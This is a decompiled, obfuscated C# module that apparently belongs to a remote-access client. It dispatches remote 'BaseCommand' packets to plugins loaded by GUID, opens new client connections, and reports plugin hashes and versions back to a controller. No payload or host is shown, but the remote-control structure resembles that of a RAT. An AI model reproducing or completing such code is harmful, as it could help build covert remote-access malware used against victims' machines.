using System;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class11
{
	public static void smethod_0(GStruct2 gstruct2_0)
	{
		switch (gstruct2_0.byte_1)
		{
		case 1:
			smethod_1();
			break;
		case 2:
			smethod_3(gstruct2_0.object_0);
			break;
		case 4:
			smethod_2(gstruct2_0.guid_0, gstruct2_0.object_0);
			break;
		case 6:
			smethod_4();
			break;
		case 7:
			smethod_5(gstruct2_0.object_0);
			break;
		case 3:
		case 5:
			break;
		}
	}

	public static void smethod_1()
	{
		Class8.smethod_75(bool_6: true);
	}

	public static void smethod_2(Guid guid_0, object[] object_0)
	{
		GClass2 gClass = Class14.smethod_1(guid_0);
		if (gClass != null)
		{
			try
			{
				gClass.gclass3_0.method_7(null, object_0);
				return;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception_ = ex;
				Class8.smethod_85(gClass.gclass3_0, exception_, "ReadPacket []");
				ProjectData.ClearProjectError();
				return;
			}
		}
		throw new Exception($"No instance of plugin '{guid_0}' could be found.");
	}

	public static void smethod_3(object[] object_0)
	{
		string text = (string)object_0[0];
		Guid guid_ = (Guid)object_0[1];
		Guid guid = (Guid)object_0[2];
		if (!Class8.dictionary_2.ContainsKey(text))
		{
			Client client = Class8.smethod_39();
			Class8.dictionary_2.Add(text, client);
			GClass3 gclass3_ = null;
			if (!(guid == Guid.Empty))
			{
				gclass3_ = Class14.smethod_1(guid).gclass3_0;
			}
			client.method_31(new GClass0());
			client.method_30().method_0(guid_, text, gclass3_);
			client.method_4(Class8.smethod_78);
			client.method_6(Class8.smethod_77);
			client.method_2(Class8.smethod_79);
			client.method_14(Class8.smethod_81);
			client.method_44(Class8.smethod_65(), Class15.smethod_6());
		}
	}

	public static void smethod_4()
	{
		Class8.dateTime_2 = DateTime.Now;
	}

	public static void smethod_5(object[] object_0)
	{
		string string_ = (string)object_0[0];
		if ((bool)object_0[1])
		{
			try
			{
				string text = Class8.smethod_61(string_);
				if (!string.IsNullOrEmpty(text))
				{
					smethod_8(text);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception_ = ex;
				Class8.smethod_62(string_);
				Class8.smethod_86(exception_, "HandleBaseCommandExceptionHash");
				ProjectData.ClearProjectError();
			}
		}
		if (Class8.queue_0.Count != 0)
		{
			smethod_7(Class8.queue_0.Dequeue());
		}
	}

	public static void smethod_6(Guid guid_0, string string_0, string string_1, Version version_0)
	{
		Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.BaseCommand, 0, new object[4]
		{
			guid_0,
			string_0,
			string_1,
			version_0.ToString()
		});
	}

	public static void smethod_7(string string_0)
	{
		Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.BaseCommand, 7, new object[1] { string_0 });
	}

	public static void smethod_8(string string_0)
	{
		Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.BaseCommand, 8, new object[1] { string_0 });
	}

	public static void smethod_9()
	{
		Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.BaseCommand, 6, new object[0]);
	}
}
